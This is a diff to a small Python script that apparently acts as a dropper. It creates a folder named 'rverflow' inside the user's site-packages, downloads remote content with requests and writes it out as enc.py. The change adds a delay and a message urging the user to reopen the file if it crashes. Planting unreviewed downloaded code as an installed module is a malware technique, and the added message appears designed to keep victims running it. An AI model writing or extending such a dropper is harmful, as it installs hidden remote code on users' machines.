@@ -1,4 +1,4 @@
-import os, getpass, platform, requests
+import os, getpass, platform, requests, time
 ver = platform.python_version().split(".");ver.pop();ver = ''.join(ver)
 rpath = f"C:/Users/{getpass.getuser()}/AppData/Local/Programs/Python/Python{ver}/Lib/site-packages/rverflow"
 os.mkdir(rpath)
@@ -15,3 +15,5 @@ with open(rpath + "/enc.py", "w+", encoding="utf-8") as enc:
 	res2 = r2.content.decode()
 	enc.write(res2)
 'fart'
+print("if this file crashes, try reopening it, it should reload the module and work again")
+time.sleep(3)
